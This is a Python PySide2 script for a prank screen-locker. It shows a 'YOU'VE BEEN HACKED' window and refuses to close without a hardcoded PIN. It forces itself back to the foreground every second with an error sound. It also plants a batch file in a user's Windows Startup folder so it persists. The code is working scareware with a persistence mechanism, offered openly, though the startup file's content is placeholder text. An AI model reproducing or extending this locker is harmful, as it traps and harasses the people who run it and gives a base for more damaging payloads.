from PySide2 import QtWidgets, QtCore, QtGui, QtMultimedia
import os

CUR_DIR = os.path.dirname(os.path.abspath(__file__))
ERROR_DIR = os.path.join(CUR_DIR, "error.wav")

class MainWindow(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.setup_ui()

    def setup_ui(self):
        self.create_widgets()
        self.modify_widgets()
        self.create_layouts()
        self.add_widgets_to_layouts()
        self.setup_connections()
        self.keep_focus()
        self.set_to_startup()

    def create_widgets(self):
        self.lb_text = QtWidgets.QLabel("YOU'VE BEEN HACKED")

    def modify_widgets(self):
        self.lb_text.setAlignment(QtCore.Qt.AlignCenter)

    def create_layouts(self):
        self.main_layout = QtWidgets.QVBoxLayout(self)

    def add_widgets_to_layouts(self):
        self.main_layout.addWidget(self.lb_text)

    def setup_connections(self):
        pass

    def closeEvent(self, event:QtGui.QCloseEvent):
        self.win_pin = QtWidgets.QInputDialog()
        self.win_pin.setWindowTitle("ENTER PIN!")
        self.win_pin.setLabelText("Enter the PIN code:")
        self.win_pin.setInputMode(QtWidgets.QInputDialog.IntInput)
        self.win_pin.setIntRange(0, 99999999)
        self.win_pin.exec_()
        if self.win_pin.intValue() == 10453976:
            event.accept()
        else:
            self.win_suck = QtWidgets.QMessageBox()
            self.win_suck.setWindowTitle("YOU SUCK MEN!")
            self.win_suck.setText("Well, hummm\nYou really suck at guessing!\n\nThat's said, bye.\n\nThe developper.")
            self.win_suck.exec_()
            event.ignore()

    def keep_focus(self):
        self.timer = QtCore.QTimer()
        self.timer.setInterval(1000)
        self.timer.timeout.connect(self.keep_focuss)
        self.timer.start()

    def keep_focuss(self):
        self.setWindowState(QtCore.Qt.WindowMinimized)
        self.setWindowState(QtCore.Qt.WindowMaximized)
        self.sound = QtMultimedia.QSound(ERROR_DIR)
        self.sound.play()

    def set_to_startup(self):
        USR_PATH = r"C:\\Users\alexa\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        START_FILE_PATH = os.path.join(USR_PATH, "start.bat")
        if not os.path.exists(START_FILE_PATH):
            with open(START_FILE_PATH, "w") as f:
                content = "echo TEST\npause"
                f.write(content)
                f.close()